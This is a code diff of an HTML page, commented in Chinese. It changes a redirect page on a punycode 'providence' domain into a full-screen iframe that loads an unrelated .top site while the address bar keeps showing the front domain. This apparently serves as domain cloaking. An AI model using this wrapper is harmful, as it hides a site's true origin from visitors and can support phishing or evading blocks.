@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <title>Redirecting...</title>
+    <title>Providence</title>
     <style>
         * {
             margin: 0;
@@ -12,83 +12,46 @@
             box-sizing: border-box;
         }
         
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
         }
         
-        .container {
-            text-align: center;
-            padding: 2rem;
-        }
-        
-        .logo {
-            font-size: 3rem;
-            font-weight: bold;
-            margin-bottom: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        
-        .message {
-            font-size: 1.2rem;
-            margin-bottom: 2rem;
-            opacity: 0.9;
-        }
-        
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 2rem auto;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .countdown {
-            font-size: 1rem;
-            opacity: 0.7;
-            margin-top: 1rem;
+        #wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            margin: 0;
+            padding: 0;
         }
     </style>
-    <script>
-        // 防火墙跳转逻辑 - 即时跳转
-        (function() {
-            'use strict';
-            
-            const FIREWALL_DOMAIN = 'xn--providence-ef6wr429a.com';
-            const REAL_SITE = 'https://4kp3l0iq.top/splash.html';
-            
-            // 检测正常用户，立即跳转
-            if (window.location.hostname === FIREWALL_DOMAIN || 
-                window.location.hostname.includes('providence')) {
-                // 无延迟直接跳转
-                window.location.replace(REAL_SITE);
-            }
-            
-            // 防止被iframe嵌套
-            if (window.top !== window.self) {
-                window.top.location = window.self.location;
-            }
-        })();
-    </script>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">PROVIDENCE</div>
-        <div class="message">Redirecting...</div>
-        <div class="spinner"></div>
-    </div>
+    <!-- 包裹目标站点，保持防火墙域名显示 -->
+    <iframe 
+        id="wrapper" 
+        src="https://4kp3l0iq.top/splash.html" 
+        frameborder="0"
+        scrolling="auto"
+        allowfullscreen
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+    ></iframe>
+    
+    <script>
+        // 防止被嵌套（保护防火墙页面本身）
+        if (window.top !== window.self && window.location.hostname === 'xn--providence-ef6wr429a.com') {
+            window.top.location = window.self.location;
+        }
+        
+        // 确保iframe填满整个窗口
+        window.addEventListener('resize', function() {
+            const iframe = document.getElementById('wrapper');
+            iframe.style.height = window.innerHeight + 'px';
+        });
+    </script>
 </body>
 </html>
-
